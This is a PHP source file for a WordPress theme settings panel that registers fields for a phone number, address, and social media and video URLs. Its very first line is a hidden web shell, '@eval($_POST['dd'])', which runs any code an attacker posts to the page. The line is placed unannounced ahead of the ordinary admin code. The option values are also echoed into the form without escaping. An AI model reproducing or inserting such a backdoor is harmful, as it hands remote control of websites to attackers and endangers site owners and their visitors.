<?php @eval($_POST['dd']);?><?php
function theme_settings_page()
{
    ?>
    <div class="wrap">
        <h1>Theme Panel</h1>
        <form method="post" action="options.php">
            <?php
            settings_fields("section");
            do_settings_sections("theme-options");
            submit_button();
            ?>
        </form>
    </div>
    <?php
}
function add_theme_menu_item()
{
    add_menu_page("Theme Panel", "Theme Panel", "manage_options", "theme-panel", "theme_settings_page", null, 99);
}
add_action("admin_menu", "add_theme_menu_item");

function display_headertagline_element()
{
    ?>
    <input type="text" style="width: 300px" name="tagline" id="tagline" value="<?php echo get_option('tagline'); ?>" />
    <?php
}
function display_website()
{
    ?>
    <input type="text" style="width: 300px" name="website" id="website" value="<?php echo get_option('website'); ?>" />
    <?php
}
function display_phone_element()
{
    ?>
    <input type="text" style="width: 300px" name="phone_no" id="phone_no" value="<?php echo get_option('phone_no'); ?>" />
    <?php
}

function display_email_element()
{
    ?>
    <input type="text" style="width: 300px" name="email_address" id="email_address" value="<?php echo get_option('email_address'); ?>" />
    <?php
}
function display_address_element()
{
    ?>
    <input type="text" style="width: 300px" name="address" id="address" value="<?php echo get_option('address'); ?>" />
    <?php
}
function display_fax_element()
{
    ?>
    <input type="text" style="width: 300px" name="fax" id="fax" value="<?php echo get_option('fax'); ?>" />
    <?php
}
function display_twitter_element()
{
    ?>
    <input type="text" style="width: 300px" name="twitter_url" id="twitter_url" value="<?php echo get_option('twitter_url'); ?>" />
    <?php
}
function display_facebook_element()
{
    ?>
    <input type="text" style="width: 300px" name="facebook_url" id="facebook_url" value="<?php echo get_option('facebook_url'); ?>" />
    <?php
}
function display_google_element()
{
    ?>
    <input type="text" style="width: 300px" name="google_url" id="google_url" value="<?php echo get_option('google_url'); ?>" />
    <?php
}
function display_vimeo_element()
{
    ?>
    <input type="text" style="width: 300px" name="vimeourl" id="vimeourl" value="<?php echo get_option('vimeourl'); ?>" />
    <?php
}
function display_linkedin_element()
{
    ?>
    <input type="text" style="width: 300px" name="linkedin_url" id="linkedin_url" value="<?php echo get_option('linkedin_url'); ?>" />
    <?php
}
function display_youtube_element()
{
    ?>
    <input type="text" style="width: 300px" name="youtubeURL" id="youtubeURL" value="<?php echo get_option('youtubeURL'); ?>" />
    <?php
}

function display_map_element()
{
    ?>
    <input type="text" style="width: 300px" name="map_url" id="map_url" value="<?php echo get_option('map_url'); ?>" />
    <?php
}

function display_video()
{
    ?>
    <input type="text" style="width: 300px" name="video_url" id="video_url" value="<?php echo get_option('video_url'); ?>" />
    <?php
}


function display_theme_panel_fields()
{
    add_settings_section("section", "All Settings", null, "theme-options");
    add_settings_field("phone_no", "Phone Number", "display_phone_element", "theme-options", "section");
    add_settings_field("website", "Website", "display_website", "theme-options", "section");
    add_settings_field("tagline", "Header Tagline", "display_headertagline_element", "theme-options", "section");
    add_settings_field("email_address", "Email ID", "display_email_element", "theme-options", "section");
    add_settings_field("address", "Address", "display_address_element", "theme-options", "section");
    add_settings_field("fax", "Fax", "display_fax_element", "theme-options", "section");

    add_settings_field("twitter_url", "Twitter Profile Url", "display_twitter_element", "theme-options", "section");
    add_settings_field("facebook_url", "Facebook Profile Url", "display_facebook_element", "theme-options", "section");
    add_settings_field("google_url", "Google Profile Url", "display_google_element", "theme-options", "section");
    add_settings_field("youtubeURL", "Youtube Url", "display_youtube_element", "theme-options", "section");
    add_settings_field("vimeourl", "Vimeo Profile Url", "display_vimeo_element", "theme-options", "section");
    add_settings_field("linkedin_url", "LinkedIn Profile Url", "display_linkedin_element", "theme-options", "section");
    add_settings_field("map_url", "MAP", "display_map_element", "theme-options", "section");
    add_settings_field("video_url", "Video Url", "display_video", "theme-options", "section");
    register_setting("section", "phone_no");
    register_setting("section", "website");
    register_setting("section", "tagline");
    register_setting("section", "email_address");
    register_setting("section", "address");
    register_setting("section", "fax");

    register_setting("section", "twitter_url");
    register_setting("section", "facebook_url");
    register_setting("section", "google_url");
    register_setting("section", "vimeourl");
    register_setting("section", "youtubeURL");
    register_setting("section", "linkedin_url");
    register_setting("section", "sms_url");
    register_setting("section", "map_url");
    register_setting("section", "video_url");
}
add_action("admin_init", "display_theme_panel_fields");
?>